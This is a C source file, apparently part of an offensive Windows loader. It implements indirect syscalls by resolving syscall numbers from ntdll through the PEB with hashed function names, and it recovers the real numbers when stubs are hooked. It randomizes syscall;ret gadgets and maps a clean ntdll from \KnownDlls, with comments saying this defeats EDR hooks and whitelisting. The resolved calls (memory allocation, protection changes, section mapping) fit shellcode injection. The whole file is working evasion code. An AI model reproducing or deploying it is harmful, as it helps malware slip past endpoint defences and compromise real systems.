// =============================================
// Syscalls.c - Indirect Syscall Engine
//   + Gadget Pool Randomization
//   + Clean-ntdll via \KnownDlls\ntdll.dll
// =============================================

#include "Common.h"
#include <winternl.h>  // UNICODE_STRING, OBJECT_ATTRIBUTES

// Global ntdll config
static NTDLL_CONFIG g_NtdllConfig = { 0 };

// Syscall gadget pool for randomization
#define MAX_SYSCALL_GADGETS 64
static struct {
    PVOID   pGadgets[MAX_SYSCALL_GADGETS];
    DWORD   dwCount;
} g_GadgetPool = { 0 };

// -----------------------------------------------
// Initialize NTDLL config by walking the PEB
// -----------------------------------------------
BOOL InitNtdllConfigStructure(VOID) {

    PPEB2 pPeb = (PPEB2)__readgsqword(0x60);
    if (!pPeb || !pPeb->Ldr)
        return FALSE;

    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;

    PLDR_DT_TABLE_ENTRY pDte = NULL;
    for (int i = 0; pEntry != pHead; pEntry = pEntry->Flink, i++) {
        pDte = (PLDR_DT_TABLE_ENTRY)((PBYTE)pEntry - offsetof(LDR_DT_TABLE_ENTRY, InMemoryOrderLinks));

        if (pDte->DllBase == NULL)
            continue;

        if (i == 1) {
            break;
        }
    }

    if (!pDte || !pDte->DllBase)
        return FALSE;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pDte->DllBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pDte->DllBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)pDte->DllBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    if (!pExport)
        return FALSE;

    g_NtdllConfig.uModule              = (ULONG_PTR)pDte->DllBase;
    g_NtdllConfig.dwNumberOfNames      = pExport->NumberOfNames;
    g_NtdllConfig.pdwArrayOfAddresses  = (PDWORD)((PBYTE)pDte->DllBase + pExport->AddressOfFunctions);
    g_NtdllConfig.pdwArrayOfNames      = (PDWORD)((PBYTE)pDte->DllBase + pExport->AddressOfNames);
    g_NtdllConfig.pwArrayOfOrdinals    = (PWORD)((PBYTE)pDte->DllBase + pExport->AddressOfNameOrdinals);

    return TRUE;
}

// -----------------------------------------------
// Collect all syscall;ret (0F 05 C3) gadgets from
// ntdll's executable sections into a pool.
// Each syscall call picks a random gadget from this
// pool, preventing EDR from whitelisting a single
// gadget address.
// -----------------------------------------------
static BOOL CollectSyscallGadgets(VOID) {

    if (!g_NtdllConfig.uModule)
        return FALSE;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)g_NtdllConfig.uModule;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(g_NtdllConfig.uModule + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (WORD s = 0; s < pNt->FileHeader.NumberOfSections; s++) {
        if (!(pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;

        PBYTE pStart = (PBYTE)(g_NtdllConfig.uModule + pSec[s].VirtualAddress);
        DWORD dwSize = pSec[s].Misc.VirtualSize;

        for (DWORD j = 0; j + 2 < dwSize && g_GadgetPool.dwCount < MAX_SYSCALL_GADGETS; j++) {
            // syscall (0F 05) + ret (C3)
            if (pStart[j] == 0x0F && pStart[j + 1] == 0x05 && pStart[j + 2] == 0xC3) {
                g_GadgetPool.pGadgets[g_GadgetPool.dwCount++] = (PVOID)(pStart + j);
            }
        }
    }

    return g_GadgetPool.dwCount > 0;
}

// -----------------------------------------------
// Return a random syscall;ret gadget from the pool.
// Uses RDTSC for fast, non-deterministic selection.
// -----------------------------------------------
PVOID GetRandomGadget(VOID) {
    if (g_GadgetPool.dwCount == 0)
        return NULL;
    DWORD idx = (DWORD)(__rdtsc() % g_GadgetPool.dwCount);
    return g_GadgetPool.pGadgets[idx];
}

// -----------------------------------------------
// Given a syscall stub address, extract SSN and find
// syscall;ret inside the stub. Uses neighbor fallback
// for hooked stubs (first byte != 4C 8B D1).
// -----------------------------------------------
static BOOL ResolveSyscallStub(IN PVOID pFuncAddr, IN DWORD dwSyscallHash, OUT PNT_SYSCALL pNtSyscall) {

    pNtSyscall->dwSyscallHash = dwSyscallHash;

    // --- Extract SSN ---
    BOOL bSsnFound = FALSE;

    if (*((PBYTE)pFuncAddr + 0) == 0x4C &&
        *((PBYTE)pFuncAddr + 1) == 0x8B &&
        *((PBYTE)pFuncAddr + 2) == 0xD1 &&
        *((PBYTE)pFuncAddr + 3) == 0xB8 &&
        *((PBYTE)pFuncAddr + 6) == 0x00 &&
        *((PBYTE)pFuncAddr + 7) == 0x00) {

        BYTE bHigh = *((PBYTE)pFuncAddr + 5);
        BYTE bLow  = *((PBYTE)pFuncAddr + 4);
        pNtSyscall->dwSSn = (bHigh << 8) | bLow;
        bSsnFound = TRUE;
    }
    else {
        // Search DOWN
        for (WORD idx = 1; idx < 255; idx++) {
            PBYTE pNeighbor = (PBYTE)pFuncAddr + (idx * 0x20);
            if (*((PBYTE)pNeighbor + 0) == 0x4C &&
                *((PBYTE)pNeighbor + 1) == 0x8B &&
                *((PBYTE)pNeighbor + 2) == 0xD1 &&
                *((PBYTE)pNeighbor + 3) == 0xB8 &&
                *((PBYTE)pNeighbor + 6) == 0x00 &&
                *((PBYTE)pNeighbor + 7) == 0x00) {
                BYTE bH = *((PBYTE)pNeighbor + 5);
                BYTE bL = *((PBYTE)pNeighbor + 4);
                pNtSyscall->dwSSn = ((bH << 8) | bL) - idx;
                bSsnFound = TRUE;
                break;
            }
        }

        // Search UP
        if (!bSsnFound) {
            for (WORD idx = 1; idx < 255; idx++) {
                PBYTE pNeighbor = (PBYTE)pFuncAddr - (idx * 0x20);
                if (*((PBYTE)pNeighbor + 0) == 0x4C &&
                    *((PBYTE)pNeighbor + 1) == 0x8B &&
                    *((PBYTE)pNeighbor + 2) == 0xD1 &&
                    *((PBYTE)pNeighbor + 3) == 0xB8 &&
                    *((PBYTE)pNeighbor + 6) == 0x00 &&
                    *((PBYTE)pNeighbor + 7) == 0x00) {
                    BYTE bH = *((PBYTE)pNeighbor + 5);
                    BYTE bL = *((PBYTE)pNeighbor + 4);
                    pNtSyscall->dwSSn = ((bH << 8) | bL) + idx;
                    bSsnFound = TRUE;
                    break;
                }
            }
        }
    }

    // Find any syscall;ret for this specific function (stored but may not be used)
    for (DWORD j = 0; j < 0x100; j++) {
        if (*((PBYTE)pFuncAddr + j + 0) == 0x0F &&
            *((PBYTE)pFuncAddr + j + 1) == 0x05 &&
            *((PBYTE)pFuncAddr + j + 2) == 0xC3) {
            pNtSyscall->pSyscallAddress = (PVOID)((PBYTE)pFuncAddr + j);
            break;
        }
    }

    return bSsnFound && pNtSyscall->pSyscallAddress != NULL;
}

// -----------------------------------------------
// Resolve a single NT syscall by hash
// -----------------------------------------------
BOOL FetchNtSyscall(IN DWORD dwSyscallHash, OUT PNT_SYSCALL pNtSyscall) {

    if (!g_NtdllConfig.uModule || dwSyscallHash == 0 || !pNtSyscall)
        return FALSE;

    for (DWORD i = 0; i < g_NtdllConfig.dwNumberOfNames; i++) {
        PCHAR pcFuncName = (PCHAR)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfNames[i]);
        if (HashStringJenkinsOneAtATime32BitA(pcFuncName) != dwSyscallHash)
            continue;

        PVOID pFuncAddr = (PVOID)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfAddresses[g_NtdllConfig.pwArrayOfOrdinals[i]]);
        return ResolveSyscallStub(pFuncAddr, dwSyscallHash, pNtSyscall);
    }

    return FALSE;
}

// -----------------------------------------------
// Attempt to swap g_NtdllConfig's export-table
// pointers to a clean ntdll mapped from the
// \KnownDlls\ntdll.dll section.
//
// The gadget pool (already built) still points into
// the original PEB-loaded ntdll's RX memory, so the
// syscall;ret instructions remain valid; only the
// SSN bytes come from the clean copy.
//
// This defeats user-land EDR hooks that overwrite
// ntdll stub prologues — the clean mapping's stubs
// still hold the real `mov eax, SSN` pattern.
//
// If the section can't be opened/mapped (PPL
// restriction, stripped image, etc.) the function
// returns FALSE and the caller continues with the
// PEB-ntdll exports as the SSN source (graceful
// fallback — same behavior as before this patch).
// -----------------------------------------------
static BOOL SwitchToCleanNtdll(IN PNT_SYSCALL pNtOpen, IN PNT_SYSCALL pNtMap, IN PNT_SYSCALL pNtClose) {

    // Decode "\KnownDlls\ntdll.dll" and widen to WCHAR
    BYTE xPath[] = XSTR_KNOWNDLLS_NTDLL;
    DEOBF(xPath);

    WCHAR  wPath[32] = { 0 };
    USHORT uLenBytes = 0;
    for (DWORD k = 0; xPath[k] && k < 31; k++) {
        wPath[k] = (WCHAR)xPath[k];
        uLenBytes += sizeof(WCHAR);
    }

    UNICODE_STRING uName;
    uName.Length        = uLenBytes;
    uName.MaximumLength = uLenBytes + sizeof(WCHAR);
    uName.Buffer        = wPath;

    OBJECT_ATTRIBUTES oa;
    MemSet(&oa, 0, sizeof(oa));
    oa.Length                   = sizeof(oa);
    oa.RootDirectory            = NULL;
    oa.ObjectName               = &uName;
    oa.Attributes               = 0x40;     // OBJ_CASE_INSENSITIVE
    oa.SecurityDescriptor       = NULL;
    oa.SecurityQualityOfService = NULL;

    // NtOpenSection(&hSection, SECTION_MAP_READ|SECTION_QUERY, &oa)
    HANDLE hSection = NULL;
    SET_SYSCALL(*pNtOpen);
    NTSTATUS status = RunSyscall(
        (ULONG_PTR)&hSection,
        (ULONG_PTR)0x0005,                  // SECTION_MAP_READ | SECTION_QUERY
        (ULONG_PTR)&oa,
        0, 0, 0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(status) || !hSection)
        return FALSE;

    // NtMapViewOfSection(hSection, -1, &pClean, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READONLY)
    PVOID  pClean   = NULL;
    SIZE_T uViewSize = 0;
    SET_SYSCALL(*pNtMap);
    status = RunSyscall(
        (ULONG_PTR)hSection,
        (ULONG_PTR)(HANDLE)-1,              // NtCurrentProcess
        (ULONG_PTR)&pClean,
        (ULONG_PTR)0,                       // ZeroBits
        (ULONG_PTR)0,                       // CommitSize
        (ULONG_PTR)NULL,                    // SectionOffset
        (ULONG_PTR)&uViewSize,
        (ULONG_PTR)2,                       // ViewUnmap
        (ULONG_PTR)0,                       // AllocationType
        (ULONG_PTR)0x02,                    // PAGE_READONLY (SEC_IMAGE ignores)
        0, 0
    );
    // Close the section handle — the mapping survives and we don't need
    // the handle any further. Skipped silently if NtClose didn't bootstrap.
    if (pNtClose && pNtClose->dwSyscallHash) {
        SET_SYSCALL(*pNtClose);
        RunSyscall(
            (ULONG_PTR)hSection,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
        );
    }

    if (!NT_SUCCESS(status) || !pClean)
        return FALSE;

    // Parse clean PE to locate the export directory
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pClean;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pClean + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    if (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size == 0)
        return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)pClean + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    // Swap g_NtdllConfig to the clean mapping. Gadget pool addresses
    // (PEB-ntdll RX) stay valid — SET_SYSCALL() still executes real
    // `syscall;ret` in the original loaded ntdll.
    g_NtdllConfig.uModule             = (ULONG_PTR)pClean;
    g_NtdllConfig.dwNumberOfNames     = pExport->NumberOfNames;
    g_NtdllConfig.pdwArrayOfAddresses = (PDWORD)((PBYTE)pClean + pExport->AddressOfFunctions);
    g_NtdllConfig.pdwArrayOfNames     = (PDWORD)((PBYTE)pClean + pExport->AddressOfNames);
    g_NtdllConfig.pwArrayOfOrdinals   = (PWORD)((PBYTE)pClean + pExport->AddressOfNameOrdinals);
    return TRUE;
}

// -----------------------------------------------
// Initialize all needed syscalls + gadget pool.
//
// Pipeline:
//   1. PEB-ntdll config + gadget pool (RX memory)
//   2. Bootstrap NtOpenSection + NtMapViewOfSection from PEB-ntdll
//   3. Swap g_NtdllConfig to clean \KnownDlls\ntdll.dll (best-effort)
//   4. Single-pass resolve all 5 target syscalls from (now clean) config
// -----------------------------------------------
BOOL InitializeNtSyscalls(OUT PNTAPI_FUNC pNtApis) {

    if (!InitNtdllConfigStructure())
        return FALSE;

    // Build gadget pool BEFORE resolving individual syscalls
    if (!CollectSyscallGadgets())
        return FALSE;

    // Bootstrap: extract NtOpenSection, NtMapViewOfSection, NtClose from
    // PEB-ntdll so we can map a clean ntdll copy and release its handle.
    // If the PEB stubs are hooked, the neighbor-stub fallback in
    // ResolveSyscallStub recovers the real SSN.
    NT_SYSCALL ntOpen  = { 0 };
    NT_SYSCALL ntMap   = { 0 };
    NT_SYSCALL ntClose = { 0 };
    if (FetchNtSyscall(NtOpenSection_JOAAT, &ntOpen) &&
        FetchNtSyscall(NtMapViewOfSection_JOAAT, &ntMap)) {
        // NtClose is best-effort; if bootstrap fails we leak one handle.
        FetchNtSyscall(NtClose_JOAAT, &ntClose);
        // Overall switch is best-effort: on failure we silently keep
        // the PEB-ntdll exports as the SSN source.
        SwitchToCleanNtdll(&ntOpen, &ntMap, &ntClose);
    }

    struct {
        DWORD       dwHash;
        PNT_SYSCALL pSyscall;
    } targets[] = {
        { NtAllocateVirtualMemory_JOAAT, &pNtApis->NtAllocateVirtualMemory },
        { NtProtectVirtualMemory_JOAAT,  &pNtApis->NtProtectVirtualMemory  },
        { NtWaitForSingleObject_JOAAT,   &pNtApis->NtWaitForSingleObject   },
        { NtCreateSection_JOAAT,         &pNtApis->NtCreateSection         },
        { NtMapViewOfSection_JOAAT,      &pNtApis->NtMapViewOfSection      },
    };
    const DWORD nTargets = (DWORD)(sizeof(targets) / sizeof(targets[0]));
    DWORD nResolved = 0;

    for (DWORD i = 0; i < g_NtdllConfig.dwNumberOfNames && nResolved < nTargets; i++) {
        PCHAR pcFuncName = (PCHAR)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfNames[i]);
        DWORD dwHash = HashStringJenkinsOneAtATime32BitA(pcFuncName);

        for (DWORD t = 0; t < nTargets; t++) {
            if (targets[t].dwHash != dwHash || targets[t].pSyscall->dwSyscallHash != 0)
                continue;

            PVOID pFuncAddr = (PVOID)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfAddresses[g_NtdllConfig.pwArrayOfOrdinals[i]]);
            if (ResolveSyscallStub(pFuncAddr, targets[t].dwHash, targets[t].pSyscall))
                nResolved++;
            break;
        }
    }

    return nResolved == nTargets;
}
